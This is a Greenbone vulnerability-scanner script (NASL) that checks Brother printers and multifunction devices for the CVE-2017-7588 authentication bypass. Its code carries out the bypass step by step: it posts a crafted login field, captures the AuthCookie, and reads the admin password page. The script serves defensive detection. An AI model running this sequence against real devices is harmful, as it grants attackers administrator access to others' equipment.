# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107152");
  script_version("2023-07-14T16:09:27+0000");
  script_tag(name:"last_modification", value:"2023-07-14 16:09:27 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"creation_date", value:"2017-04-24 13:30:11 +0200 (Mon, 24 Apr 2017)");
  script_cve_id("CVE-2017-7588");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-08-16 01:29:00 +0000 (Wed, 16 Aug 2017)");

  script_name("Brother Devices - Authentication Bypass / Password Change Exploit");

  script_tag(name:"summary", value:"Most of Brother devices web authorization can be bypassed through a trivial bug in the login process.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks if it is possible to get cookie infos.");

  script_tag(name:"insight", value:"Authorization cookie information can be used to crack the current password from exported cookie.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to login as admin.");

  script_tag(name:"affected", value:"MFC-J6973CDW, MFC-J4420DW, MFC-8710DW, MFC-J4620DW, MFC-L8850CDW, MFC-J3720, MFC-J6520DW, MFC-L2740DW,
  MFC-J5910DW, , MFC-J6920DW, MFC-L2700DW, MFC-9130CW, MFC-9330CDW, MFC-9340CDW, MFC-J5620DW, MFC-J6720DW, MFC-L8600CDW, MFC-L9550CDW, MFC-L2720DW,
  DCP-L2540DW, DCP-L2520DW, HL-3140CW, HL-3170CDW, HL-3180CDW, HL-L8350CDW, HL-L2380DW, ADS-2500W, ADS-1000W, ADS-1500W");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.

  A workaround is to minimize the network access to the Brother MFC device or disable the HTTP(S) interface.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41863/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );

#retrieving Logvalue
url = "/general/status.html";

req = http_get_req( port:port, url:url, add_headers:make_array( 'Accept', '*/*', 'Content-Type', 'application/x-www-form-urlencoded' ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( recv !~ "^HTTP/1\.[01] 200" || "Please configure the password" >< recv ) exit( 0 );

Logvalue = eregmatch( pattern:'LogBox" name="([A-Za-z0-9]*)"', string:recv );
Logvalue = Logvalue[1];

#retrieving cookies
data = Logvalue + "=xyz&loginurl=/general/status.html";

req = http_post_put_req( port:port, url:url, data:data, add_headers: make_array( 'Accept', '*/*', 'Content-Type', 'application/x-www-form-urlencoded' ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ( recv =~ "^HTTP/1\.[01] 301" || recv =~ "^HTTP/1\.[01] 200") && ( "<title>Brother" >< recv ) ) {
  cookie = eregmatch( pattern:"Set-Cookie: AuthCookie=([0-9a-z]*);", string:recv );
  cookie = cookie[1];
}

#retrieving password
url = "/admin/password.html";

req = http_get_req( port:port, url:url, add_headers:make_array( 'Accept', '*/*', 'Cookie', 'AuthCookie=' + cookie ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( recv =~ "^HTTP/1\.[01] 200" && "<title>Brother" >< recv ) {

  password = eregmatch( pattern:'type="password" class="password" id="([A-Za-z0-9]*)" name="([A-Za-z0-9]*)"', string:recv );
  if( ! isnull( password[ 2 ] ) ) {
    report = "The following password could be retrieved and which could be used to bypass authentication: " + password[2];
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
